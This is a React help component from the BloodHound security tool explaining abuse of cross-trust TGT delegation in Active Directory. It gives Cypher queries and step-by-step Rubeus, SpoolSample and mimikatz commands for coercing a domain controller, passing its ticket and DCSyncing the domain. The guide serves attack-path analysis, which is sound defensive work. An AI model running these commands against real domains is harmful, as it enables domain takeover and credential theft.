// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import CodeController from '../CodeController/CodeController';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                The TGT delegation enables an attacker to capture TGTs of privileged users or computers of the target
                domain as they authenticate against a computer configured with unconstrained delegation.
            </Typography>
            <Typography variant='body2'>
                A common way for attackers to abuse this is for the attacker to log in on a DC of the source domain and
                coerce a DC of the target domain. DCs have unconstrained delegation enabled by default. That gives the
                attacker a TGT of a DC of the target domain, which enables the attacker to DCSync the target domain.
                This is the version of the attack detailed here.
            </Typography>
            <Typography variant='body2'>
                The attack will fail if the target is member of Protected Users or marked as not trusted for delegation,
                as the TGT of those principals will not be sent to the hosts with unconstrained delegation. You can find
                all the protected principals with this Cypher query:
            </Typography>
            <CodeController>
                {`MATCH (g:Group)
                WHERE g.objectid ENDS WITH "-525"
                MATCH (n:Base)
                WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
                RETURN n
                LIMIT 1000`}
            </CodeController>
            <Typography variant='body2'>
                Alternatively, the attacker can target other privileged computers or users than DCs.
            </Typography>
            <Typography variant='body2'>
                The attacker can also use other non-DC hosts (or user) in the source domain with unconstrained
                delegation enabled. To find all non-DC principals in BloodHound with unconstrained delegation, run this
                Cypher query:
            </Typography>
            <CodeController>
                {`MATCH (n:Base)
                WHERE n.unconstraineddelegation = TRUE AND NOT (n)-[:DCFor]->()
                RETURN n`}
            </CodeController>
            <Typography variant='body2'>
                The printspooler may be disabled on the target host. Other coercion techniques can be used in that case
                (see References).
            </Typography>
            <Typography variant='body1'>Step 1: Start monitoring for TGTs</Typography>
            <Typography variant='body2'>Log in on a DC of the source domain and open CMD as Administrator.</Typography>
            <Typography variant='body2'>Start monitoring for incoming TGTs using Rubeus:</Typography>
            <Typography component={'pre'}>
                {'Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap'}
            </Typography>

            <Typography variant='body1'>Step 2: Coerce target DC</Typography>
            <Typography variant='body2'>
                From any host in the domain, coerce the target DC using SpoolSample:
            </Typography>
            <Typography component={'pre'}>
                {'SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local'}
            </Typography>
            <Typography variant='body2'>Rubeus will print the DC TGT as it is received.</Typography>
            <Typography variant='body2'>
                This will fail if there is no trust from the targeted domain to the attacker controlled domain. In that
                case, the coercion must be executed in the context of a principal of the target forest. Luckily for the
                attacker, they can use the trust account attack to obtain a session as such a principal (see References
                for details).
            </Typography>

            <Typography variant='body1'>Step 3: Pass the Ticket</Typography>
            <Typography variant='body2'>
                Inject the DC TGT into memory using Rubeus on any computer in the domain:
            </Typography>
            <Typography component={'pre'}>{'Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...'}</Typography>

            <Typography variant='body1'>Step 4: DCSync target domain</Typography>
            <Typography variant='body2'>
                Use mimikatz to DCSync the target domain from the computer where the DC TGT was injected:
            </Typography>
            <Typography component={'pre'}>
                {'lsadump::dcsync /domain:domain.local /user:EXTERNAL\\Administrator'}
            </Typography>
        </>
    );
};

export default WindowsAbuse;
